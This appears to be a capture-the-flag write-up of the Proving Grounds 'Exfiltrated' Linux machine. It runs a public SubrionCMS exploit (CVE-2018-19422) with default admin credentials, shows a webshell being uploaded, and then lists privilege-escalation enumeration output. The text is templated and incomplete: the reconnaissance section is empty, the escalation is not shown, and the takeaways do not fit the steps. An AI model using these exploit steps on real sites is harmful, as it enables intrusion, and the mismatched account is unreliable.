---
title: "Proving Grounds - Exfiltrated (Linux)"
date: 2026-02-25
description: "Proving Grounds Exfiltrated Linux walkthrough covering reconnaissance, initial access, and privilege escalation."
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
---

## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | Web application and exposed network services |
| Primary Entry Vector      | Web RCE (CVE-2018-19422, CVE-2021-22204) |
| Privilege Escalation Path | Local enumeration -> misconfiguration abuse -> root |

## Credentials

No credentials obtained.

## Reconnaissance

---
💡 Why this works  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## Initial Foothold

---
![Screenshot from the exfiltrated engagement](/assets/img/pg/exfiltrated/Pasted%20image%2020260122004134.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the exfiltrated engagement](/assets/img/pg/exfiltrated/Pasted%20image%2020260122011811.png)
*Caption: Screenshot captured during this stage of the assessment.*

![Screenshot from the exfiltrated engagement](/assets/img/pg/exfiltrated/Pasted%20image%2020260122012911.png)
*Caption: Screenshot captured during this stage of the assessment.*

Reverse shell callback succeeded:
https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```

```bash
✅[1:29][CPU:3][MEM:70][TUN0:192.168.45.178][...2018-19422-SubrionCMS-RCE]
🐉 > python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: esVHdLZTvKAZetNpW8hrGLNYZHY11rUHtypp8j1Y
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: uxwwjimknozsrki

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/uxwwjimknozsrki.phar

$

```

![Screenshot from the exfiltrated engagement](/assets/img/pg/exfiltrated/Pasted%20image%2020260122015414.png)
*Caption: Screenshot captured during this stage of the assessment.*

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
php -e ./uxwwjimknozsrki.phar
```

```bash
$ php -e ./uxwwjimknozsrki.phar
```

💡 Why this works  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## Privilege Escalation

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2021-06-10+12:06:15.4750619470 /opt/image-exif.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  3 root root 4096 Jun 10  2021 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
-rwxr-xr-x  1 root root  437 Jun 10  2021 image-exif.sh
drwxr-xr-x  2 root root 4096 Jun 10  2021 metadata

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

No additional logs saved.

💡 Why this works  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## Lessons Learned / Key Takeaways

- Validate framework debug mode and error exposure in production-like environments.
- Restrict file permissions on scripts and binaries executed by privileged users or schedulers.
- Harden sudo policies to avoid wildcard command expansion and scriptable privileged tools.
- Treat exposed credentials and environment files as critical secrets.

## References

- CVE-2018-19422: https://nvd.nist.gov/vuln/detail/CVE-2018-19422
- CVE-2021-22204: https://nvd.nist.gov/vuln/detail/CVE-2021-22204
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
